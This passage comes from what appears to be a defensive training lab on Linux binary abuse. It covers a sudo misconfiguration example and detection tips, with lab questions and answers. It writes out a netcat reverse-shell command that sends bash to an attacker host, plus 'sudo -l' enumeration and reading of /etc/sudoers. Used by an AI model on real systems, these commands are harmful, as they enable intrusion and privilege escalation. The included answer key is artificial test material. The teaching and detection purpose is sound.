- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “ssh”   - Searchable from history on Linux system.  # history | grep “ssh”  or  # cat ~/.bash_history | grep “ssh”   - It can be searched from "ssh" process create or network connection events in EDR/XDR logs.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - Which file was downloaded from the target system using “T1070.003 -  Indicator Removal: Clear Command History” Mitre ATT&CK technique?

> **Answer:** remote_hist.txt

2 - Which file was deleted after being downloaded from the target system  using “T1070.003 - Indicator Removal: Clear Command History” Mitre  ATT&CK technique?

> **Answer:** .bash_history

3 - Which application was  utilized to download “linux.iso” file which was downloaded using the  “T1105 - Ingress Tool Transfer” Mitre ATT&CK technique?

> **Answer:** wget

4 - What is the location (/directory/file) of the file downloaded with the wget application on the operating system?

> **Answer:** /tmp/linux.iso

5 - In which system was the  command history deleted using the “T1070.003 - Indicator Removal: Clear  Command History” Mitre ATT&CK technique?

> **Answer:** 172.16.1.13

## Sudo

The sudo command is the application used to run existing  applications/commands with "super user" (root) or different user rights  on *nix systems. Attackers can run the binaries with the sudo command in cases where they are stuck on the authority constraints on the systems  they have seized. Therefore, it is the category with the most commands  in GTFOBins.

As mentioned above, almost every command is considered under this  category and we will cover the core of the Sudo command in detail with a single example. 

### **# nc command**

The **nc** (netcat) application is a simple *nix  application that reads and writes data over the network using TCP or UDP protocols. Various uses were also mentioned under several other  categories.

There are 2 systems for this application, the attacker and the victim system.

An example of the negative consequences of misconfigured or over-given sudo privileges;

**Step 1**

port 12345 port is being listened to by the nc application in the attacker’s system.

```
# nc -l -p 12345
```

**Step 2**

A reverse connection is established to the attacker’s system with nc  (netcat), which is run by an unauthorized user in the victim’s system.

(The -e /bin/bash will run the commands sent by the attacker in the bash shell.)

```
$ whoami  letsdef   $ nc destination_IP 12345 -e /bin/bash
```

**Step 3**

The attacker system wants to view the /etc/sudoers file over the  reverse connection it has obtained. However, since the letsdef user  running nc on the victim machine does not have permissions to view the  /etc/sudoers file, it replies back "cat: /etc/sudoers: Permission  denied".

```
# nc -l -p 12345  > cat /etc/sudoers   The output on the victim's side;  cat: /etc/sudoers: Permission denied
```

**Step 4**

The attacker checks the privileges of the user account that utilized  to take over the victim’s system. The attacker can list the commands  that he/she can run with sudo using the "sudo -l" command. Based on this list, he/she learns that he/she can run the nc application as sudo.

```
$ sudo -l    (root) NOPASSWD: /usr/bin/nc
```

**Step 5**

The attacker re-runs “nc” with sudo on the victim’s system.

```
$ sudo nc destination_IP 12345 -e /bin/bash
```

**Step 6**

The attacker re-runs the "cat /etc/sudoers" command through the  command center and is now able to view the relevant file contents.

```
# nc -l -p 12345  > cat /etc/sudoers  ## Sudoers allows particular users to run various commands as  ## the root user, without needing the root password. .  .  .  ….
```

### **Summary**

Commands sent from the command center received an authorization error with restricted rights, as the attacker ran “nc” with user rights to  access the command center on the system he seized. Although the admin  who manages the system allowed the "letsdef" user only the "nc"  application with "sudo" privileges, the attacker manipulated it so that  he could run all his other activities with authorized user rights. All  the commands he sent through the reverse_shell he obtained by running  "nc" as sudo were run with sudo privileges.

For detection; The usage of the sudo command should be monitored  closely. Known use cases should be excluded, in case there may be too  many activities. In addition, the status of defining sudo rights in the  system can be monitored/controlled.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “sudo”   - Searchable from history on Linux system.  # history |grep “sudo”  or  # cat ~/.bash_history |grep “sudo”   - Searchable from "sudo" process create events in EDR/XDR logs.   - Editing of /etc/sudoers file can be monitored.   - The use of the visudo command can be monitored.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - What is the user UID who pulls the list of commands that can be run with sudo?

> **Answer:** 1005

2 - In which directory did the user who wanted to view the /etc/sudoers file run this command?

> **Answer:** /home/vivek







































